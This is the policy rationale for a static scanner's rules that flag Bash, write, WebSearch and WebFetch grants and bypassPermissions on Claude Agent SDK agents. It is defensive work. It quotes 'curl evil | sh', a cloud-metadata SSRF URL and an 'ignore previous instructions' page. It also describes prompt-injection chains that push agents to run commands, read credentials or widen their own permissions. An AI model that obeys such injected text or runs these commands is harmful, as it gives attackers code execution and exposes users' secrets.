---
policy_id: claude_sdk_agent_safety
category: claude_sdk
topic: agent_safety
rules:
  - id: CSDK-101
    severity: high
    confidence: 0.8
    scope: agent
    fix_type: config
  - id: CSDK-102
    severity: medium
    confidence: 0.8
    scope: agent
    fix_type: config
  - id: CSDK-103
    severity: critical
    confidence: 0.9
    scope: agent
    fix_type: config
  - id: CSDK-104
    severity: high
    confidence: 0.8
    scope: agent
    fix_type: config
  - id: CSDK-105
    severity: high
    confidence: 0.75
    scope: agent
    fix_type: config
  - id: CSDK-120
    severity: critical
    confidence: 0.9
    scope: agent
    fix_type: config
  - id: CSDK-130
    severity: high
    confidence: 0.8
    scope: agent
    fix_type: config
  - id: CSDK-131
    severity: high
    confidence: 0.75
    scope: agent
    fix_type: config
references: [LLM01, LLM06]
---

# Policy Rationale: Subagent Wiring Safety

**Policy ID:** `claude_sdk_agent_safety`  
**File:** `claude_sdk/agent_safety.yaml`  
**Rules:** CSDK-101, CSDK-102, CSDK-103, CSDK-104, CSDK-105, CSDK-120, CSDK-130, CSDK-131  
**Severities:** high, medium, critical, high, high, critical, high, high  
**Fix types:** config, config, config, config, config, config, config, config  
**References:** LLM01, LLM06

---

## What this policy covers

Built-in tool grants and the permission posture on a Claude Agent SDK
`AgentDefinition(...)` declaration. These fire per AgentDefinition (scope:
agent) and inspect the `tools` list and `permissionMode` kwarg: CSDK-101 grants
`Bash`; CSDK-102 grants `WebSearch`; CSDK-103 sets
`permissionMode="bypassPermissions"`; CSDK-104 grants a filesystem-write
built-in (`Write`/`Edit`/`MultiEdit`/`NotebookEdit`); CSDK-105 grants
`WebFetch`. The predicates are `agent_grants_builtin_tool` (string match against
the declared tools) and `agent_kwarg_value` (for permissionMode).

Two TypeScript rules in this file fire against a different agent shape: the
`query(...)` **main agent thread** (discovery kind `claude_query_main`), not an
`AgentDefinition`. CSDK-130 flags `Bash` in the main thread's
`options.allowedTools`; CSDK-131 flags a filesystem-write built-in or `WebFetch`
there. Both read `AgentDef.ToolRefs` via the same `agent_grants_builtin_tool`
predicate the AgentDefinition rules use.

---

## Why subagent wiring is a distinct concern in agent tools

`AgentDefinition` has no guardrail mechanism of its own — no input/output
guardrails, no built-in validation hook. The tools it is handed *are* the whole
of its privilege surface. And subagents are not invoked by a human: a lead agent
dispatches them autonomously, passing a model-generated task description down. So
the chain from untrusted input to a privileged built-in is short and unattended —
a prompt-injected instruction in something the lead agent read becomes a task
description, which becomes a subagent action, with no confirmation step.

The amplifier is `permissionMode="bypassPermissions"`. The SDK's interactive
approval prompt is the one in-band control between a model-chosen tool call and a
real effect; bypass removes it for every tool the subagent holds. A subagent that
is granted `Bash` *and* runs under bypass is, in effect, unattended arbitrary
command execution driven by model output. That is why CSDK-103 is the highest-
confidence rule in this file and why the others repeatedly warn against pairing a
grant with bypass.

The grants split along two threat lines. `Bash` and the write built-ins are
*excessive agency* (OWASP LLM06): they let the subagent act far beyond a
read/research scope — run commands, rewrite source, even edit the `.claude/`
settings that govern the agent itself. `WebSearch` and `WebFetch` are
*prompt-injection intake* (OWASP LLM01): they pull untrusted external content back
into the loop, where injected instructions in a page can hijack subsequent
behavior — and `WebFetch`, taking a direct URL, is additionally an SSRF surface.

---

## Rule-by-rule defense

### CSDK-101 — Subagent is granted the Bash tool (Severity: high, Confidence: 0.8, Fix type: config)

**What we detect:** An `AgentDefinition` whose `tools` list contains `Bash`.

**Why it is flaggable:** `Bash` is arbitrary shell execution, handed to an
autonomously-dispatched subagent with no guardrail layer.

**Real-world consequence:** A "research" subagent granted `Bash` can be steered by
a poisoned task description into running `curl evil | sh` or reading credentials —
no human in the loop.

**Why severity is high and not medium:** Shell access is maximal agency; combined
with autonomous dispatch the exposure is direct. Not critical because exploitation
still needs the subagent to be driven to it.

**Fix type — config:** Remove `Bash` from the declaration's `tools` list, or gate
it with a PreToolUse hook — a wiring change, not tool code.

**Confidence 0.8:** A subagent may legitimately need shell for its job (a build
runner); the rule cannot tell a justified grant from an over-broad one, hence 0.8.

### CSDK-102 — Subagent is granted the WebSearch tool (Severity: medium, Confidence: 0.8, Fix type: config)

**What we detect:** An `AgentDefinition` whose `tools` list contains `WebSearch`.

**Why it is flaggable:** WebSearch pulls untrusted internet content into the loop;
injected instructions in results can redirect the subagent.

**Real-world consequence:** A subagent searches an attacker-seeded page; the page's
"ignore previous instructions…" text becomes part of the context and steers the
next action.

**Why severity is medium:** Granting WebSearch is routine and useful, and
untrusted-content intake only becomes harmful when paired with a follow-on
capability that can act on the injected instruction — so the grant alone is a
review signal, not a high-severity defect. It is not low because search results
are a primary prompt-injection vector with no SDK-level filtering.

**Fix type — config:** Remove `WebSearch`, or gate queries with a PreToolUse hook.

**Confidence 0.8:** Some subagents genuinely need search; the grant alone is a
strong but not certain signal.

### CSDK-103 — AgentDefinition sets permissionMode to bypassPermissions (Severity: critical, Confidence: 0.9, Fix type: config)

**What we detect:** `permissionMode="bypassPermissions"` on the AgentDefinition
(`agent_kwarg_value`).

**Why it is flaggable:** It disables the interactive approval gate for *every*
tool the subagent runs — the one control between model output and side effects.

**Real-world consequence:** A bypass subagent holding `Bash`/`Write` executes
model-chosen commands and file writes unattended; a single injection becomes an
unguarded action.

**Why severity is critical and not high:** It removes the in-band safety control
wholesale — not a missing guardrail but the deliberate disabling of the only one,
on by default for every tool the subagent runs. A single fatal switch of this
kind is exactly what a mean-based readiness score dilutes, so it is rated
critical to trip the deployment gate's critical-override directly. Highest
confidence in the file because the value is read directly.

**Fix type — config:** Drop the kwarg or set `default`/`acceptEdits`; reserve
bypass for sandboxed, non-interactive contexts.

**Confidence 0.9:** The literal value is unambiguous; the small gap is the genuinely
sandboxed CI case where bypass is defensible.

### CSDK-104 — Subagent is granted filesystem-write built-ins (Severity: high, Confidence: 0.8, Fix type: config)

**What we detect:** `tools` list contains `Write`, `Edit`, `MultiEdit`, or
`NotebookEdit`.

**Why it is flaggable:** Write access lets the subagent modify source,
configuration, or the `.claude/settings.json` that governs its own permissions —
blast radius comparable to shell.

**Real-world consequence:** A mis-scoped subagent rewrites a config file to widen
its own grants, or corrupts source during an autonomous task.

**Why severity is high and not medium:** Arbitrary write is self-amplifying (it can
edit the controls on itself) and ungated by any guardrail. Not critical pending the
trigger.

**Fix type — config:** Remove the write built-ins, or scope writes with
`add_dirs`/`cwd` and a PreToolUse hook; never pair broad write with bypass.

**Confidence 0.8:** Editor/codegen subagents legitimately need write; the rule flags
the grant for review rather than asserting a defect.

### CSDK-105 — Subagent is granted the WebFetch tool (Severity: high, Confidence: 0.75, Fix type: config)

**What we detect:** `tools` list contains `WebFetch`.

**Why it is flaggable:** WebFetch retrieves a model-chosen URL — both a
prompt-injection intake (page content re-enters the loop) and an SSRF surface (the
URL can point at internal addresses).

**Real-world consequence:** A subagent is told to fetch
`http://169.254.169.254/...` (SSRF to cloud metadata) or an attacker page whose
content carries follow-on instructions.

**Why severity is high and not medium:** It combines two distinct attack classes in
one grant. Lowest confidence here (0.75) because fetching is a common, sometimes
legitimate need and the grant alone does not prove misuse.

**Fix type — config:** Remove `WebFetch`, or gate it with a PreToolUse hook that
allowlists hosts and blocks internal ranges (see also [ssrf.md](ssrf.md)).

**Confidence 0.75:** Legitimate fetch use is frequent; treat as a review prompt.

### CSDK-120 — TypeScript AgentDefinition sets permissionMode to bypassPermissions (Severity: critical, Confidence: 0.9, Fix type: config)

**What we detect:** A TypeScript `AgentDefinition` with the kwarg
`permissionMode: "bypassPermissions"` (predicate `agent_kwarg_value`, matching
kwarg `permissionMode` against the literal value `bypassPermissions`). This is the
TypeScript twin of the Python rule
[CSDK-103](#csdk-103--agentdefinition-sets-permissionmode-to-bypasspermissions-severity-critical-confidence-09-fix-type-config);
the predicate reads the value directly off the constructor.

**Why it is flaggable:** It disables the SDK's interactive approval gate for
*every* tool the agent runs — the one in-band control between model output and a
real side effect. An agent dispatched autonomously on a model-generated task
description then reaches its tools (including `Bash`, `Write`, `Edit`) with no
per-call confirmation.

**Real-world consequence:** A bypass agent holding `Bash`/`Write` executes
model-chosen commands and file writes unattended; a single prompt-injected
instruction becomes an unguarded action with no human in the loop.

**Why severity is critical and not high:** It removes the in-band safety control
wholesale, exactly as the Python sibling does — the deliberate disabling of the
only gate between model output and a real side effect. Rated critical so the
deployment readiness gate's critical-override blocks the agent outright.
Highest-confidence rule in the file because the value is read directly from the
declaration.

**Fix type — config:** Drop the kwarg or set a safe mode (`"default"` /
`"acceptEdits"`), and restrict the tool surface with `allowedTools` /
`disallowedTools` in the constructor — a wiring change on the `AgentDefinition`,
not a change to any tool's source.

**Confidence 0.9:** The literal value is unambiguous, so the false-positive surface
is small; the residual gap is the genuinely sandboxed, non-interactive context (CI
with no secrets or network) where bypass is a defensible choice. Matches the
Python sibling CSDK-103's 0.9. A false negative remains for the session-level
`permissionMode` set on `ClaudeAgentOptions`/`query(...)` rather than on the
`AgentDefinition` — that is a separate detection surface, not covered here.

### CSDK-130 — TypeScript query() main agent is granted the Bash tool (Severity: high, Confidence: 0.8, Fix type: config)

**What we detect:**
A `query(...)` call whose `options.allowedTools` contains `Bash`
(`agent_grants_builtin_tool: [Bash]`, matched against the `query()` main agent's
resolved `ToolRefs`). Discovery models the `query(...)` main thread as an
`AgentDef` of kind `claude_query_main`, so this is the same string-grant check
CSDK-101 runs on an `AgentDefinition`, pointed at the top-level thread instead of
a subagent.

**Why it is flaggable:**
`Bash` on the main thread is arbitrary shell execution that acts directly on model
output in the conversation loop — there is no subagent boundary between a
prompt-injected instruction and the OS shell, and `AgentDefinition`/`.claude/agents`
inspection never sees the `query()` thread, so nothing else covers this grant.

**Real-world consequence:**
A main-thread agent given `Bash` is steered by an injected instruction (from a
file it read, a tool result, or user input) into running `curl evil | sh` or
reading credentials, unattended — the broadest privilege a Claude TypeScript agent
can hold.

**Why severity is high and not medium:**
Shell access on the directly-driven main thread is maximal agency with the
shortest possible path from untrusted input to a real command. Not critical only
because exploitation still requires the thread to be driven to it. Matches the
Python/subagent sibling CSDK-101's high.

**Fix type — config:**
Removing `Bash` from `options.allowedTools`, or gating it with a PreToolUse hook,
is a wiring change on the `query()` options, not a change to any tool's source.

**Confidence 0.8:**
A main thread may legitimately need shell (a developer-facing coding agent); the
grant alone cannot distinguish a justified `Bash` from an over-broad one, exactly
as for CSDK-101 — hence 0.8. The residual false negative is a `Bash` grant supplied
through a non-literal `allowedTools` (a variable the static read cannot resolve to
the constructor).

### CSDK-131 — TypeScript query() main agent is granted filesystem-write or web-fetch built-ins (Severity: high, Confidence: 0.75, Fix type: config)

**What we detect:**
A `query(...)` main agent whose `options.allowedTools` contains a filesystem-write
built-in (`Write`, `Edit`, `MultiEdit`, `NotebookEdit`) or `WebFetch`
(`agent_grants_builtin_tool` against the five names, read off the
`claude_query_main` agent's `ToolRefs`). It collapses the write-built-in concern of
the Python sibling CSDK-104 and the `WebFetch` concern of CSDK-105 into one rule on
the main thread.

**Why it is flaggable:**
On the main thread these run with no subagent boundary and no SDK guardrail
mechanism. Write access lets a prompt-injected main agent rewrite source,
configuration, or the `.claude/settings.json` that governs its own permissions —
self-amplifying, comparable blast radius to shell. `WebFetch` pulls a model-chosen
URL's content straight back into the loop, which is both a prompt-injection
re-entry (attacker page content becomes context) and a server-side request forgery
surface (the URL can point at internal/metadata addresses).

**Real-world consequence:**
A main-thread agent with `Write` rewrites a config to widen its own grants during
an autonomous task; one with `WebFetch` is steered to fetch
`http://169.254.169.254/...` (SSRF to cloud metadata) or an attacker page whose
content carries follow-on instructions.

**Why severity is high and not medium:**
It bundles two high-impact grants — self-amplifying write and the
injection-plus-SSRF fetch — on the directly-driven thread with no mediation.
Matches the high severity of both Python siblings (CSDK-104/105). Not critical
because a trigger is still required.

**Fix type — config:**
Dropping the write/fetch built-ins from `options.allowedTools`, scoping writes to a
working directory, or gating with a PreToolUse hook are wiring changes on the
`query()` options, not tool-source edits.

**Confidence 0.75:**
Lower than CSDK-130's 0.8 because the rule unions two capability classes, widening
the legitimate-use surface: a coding agent that genuinely needs `Write`, or a
research agent that genuinely needs `WebFetch`, both fire on a grant that may be
intended — the rule flags the grant for review, it does not prove misuse. This
mirrors CSDK-105's own 0.75 for the fetch case. **False positives:** a justified
write or fetch grant, or one already gated by a PreToolUse hook the static check
cannot see. **False negatives:** a grant supplied through a non-literal
`allowedTools` value, and any of these capabilities delivered through a custom
(non-built-in) tool wired into the thread, which the built-in-name match does not
cover.

---

## What this policy does not cover

- Whether a grant is *justified* — the rule sees the grant, not the subagent's real
  need. Every rule here is a review prompt, not a verdict.
- Custom (non-built-in) tools wired to the subagent that are equally dangerous —
  these checks match the built-in tool names only.
- The lead agent's dispatch logic: a subagent with safe tools can still be misused
  if the lead passes unvalidated task descriptions down.
- Hook coverage: a PreToolUse hook may already gate the granted tool, which the
  static grant check cannot see (a false positive).
- The `permissionMode` set at the `ClaudeAgentOptions` session level rather than on
  the AgentDefinition — that is CSDK-202 (see [repo.md](repo.md)).
- For CSDK-130/131: a built-in granted to the `query()` main thread through a
  non-literal `options.allowedTools` (a variable the static read cannot resolve),
  and any of these capabilities delivered through a custom (non-built-in) tool —
  the grant check matches the built-in tool names only.

---

## Recommendations beyond the fix

```python
from claude_agent_sdk import AgentDefinition

# A read/research subagent: no shell, no write, no fetch; default permissions.
research = AgentDefinition(
    name="researcher",
    description="Read-only code and docs research. Cannot run commands or write files.",
    tools=["Read", "Grep", "Glob"],
    permissionMode="default",
)
```

1. Grant the minimum tool set the subagent's role requires; default read/research
   roles to `Read`/`Grep`/`Glob` only.
2. Never pair a privileged grant (`Bash`, write built-ins, `WebFetch`) with
   `permissionMode="bypassPermissions"`.
3. Where a privileged tool is genuinely needed, gate it with a PreToolUse hook that
   allowlists exact commands, paths, or hosts — and validate the task descriptions
   the lead agent passes to the subagent.
